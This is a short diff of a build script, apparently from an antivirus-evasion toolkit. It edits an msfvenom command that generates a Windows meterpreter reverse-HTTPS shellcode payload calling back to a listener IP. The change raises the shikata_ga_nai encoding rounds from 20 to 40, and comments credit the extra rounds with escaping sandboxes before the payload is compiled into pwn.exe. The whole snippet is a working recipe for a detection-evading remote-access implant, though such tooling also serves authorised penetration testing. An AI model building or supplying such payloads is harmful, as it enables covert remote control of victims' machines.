@@ -5,7 +5,7 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 # make meterpreter unstaged reverse payload, encoded 20 rounds with shikata_ga_nai
-msfvenom -p windows/meterpreter_reverse_https lhost=192.168.2.104 lport=443 extensions=stdapi,priv -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter_reverse_https lhost=192.168.116.142 lport=443 extensions=stdapi,priv -e x86/shikata_ga_nai -i 40 -f c -a x86 --platform Windows > sc.txt
 # call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
 ./make_avet -f sc.txt
 # compile to pwn.exe file
